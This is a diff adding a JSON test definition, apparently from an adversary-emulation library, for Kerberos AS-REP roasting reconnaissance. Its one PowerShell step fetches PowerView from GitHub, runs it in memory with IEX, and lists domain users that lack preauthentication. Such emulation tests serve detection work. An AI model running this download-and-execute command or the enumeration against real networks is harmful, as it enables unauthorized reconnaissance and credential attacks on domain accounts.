@@ -1,0 +1,23 @@
+{
+  "id": "d6139549-7b72-4e48-9ea1-324fc9bdf88a",
+  "name": "Get-DomainUser with PowerView",
+  "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "acb28c50-30f1-4299-ae89-3d34d346f550",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1558.004",
+    "atomic-red-team"
+  ]
+}
